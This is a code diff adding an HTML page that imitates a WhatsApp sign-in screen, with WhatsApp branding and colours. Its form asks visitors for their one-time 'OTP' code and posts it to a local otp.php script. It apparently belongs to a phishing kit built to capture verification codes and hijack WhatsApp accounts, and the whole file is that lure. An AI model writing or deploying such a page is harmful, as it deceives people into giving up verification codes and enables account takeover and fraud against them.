@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Whatsapp - Sign in</title>
+  <style>
+  	body{
+  background: url(Image/image.png);
+  }
+  .container{
+  font-family: Sans-serif;
+  width: 320px;
+  height: 450px;
+  padding: 20px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  position: absolute;
+  top: -10%;
+  left: 50%;
+  transform: translate(-50%, 50%);
+  text-align: center;
+  border-radius: 10px;
+  background-color: white;
+  
+  }
+  
+  h2{
+  
+  }
+  
+  .box{
+  width: 100%;
+  padding: 15px 10px;
+  border-radius: 50px;
+  border: none;
+  background-color: #e6e6e6;
+  margin-top: 60px;
+  }
+  
+  .btn{
+  border: none;
+  background-color: #25d366;
+  width: 98%;
+  border-radius: 50px;
+  padding: 12px 0px;
+  color: white;
+  font-weight: bold;
+  margin-top: 30px;
+ }
+  </style>
+</head>
+<body>
+	
+	<form action="otp.php" method="post">
+		<div class="container">
+		<div>
+			<h2>WhatsApp Login</h2>
+		</div>
+		<div>
+			<input type="text" name="otp" class="box" placeholder="OTP"></input>
+		</div>
+		<div>
+			<button type="submit" class="btn">Login</button>
+		<div>
+		</div>
+	</form>
+</body>
+</html>
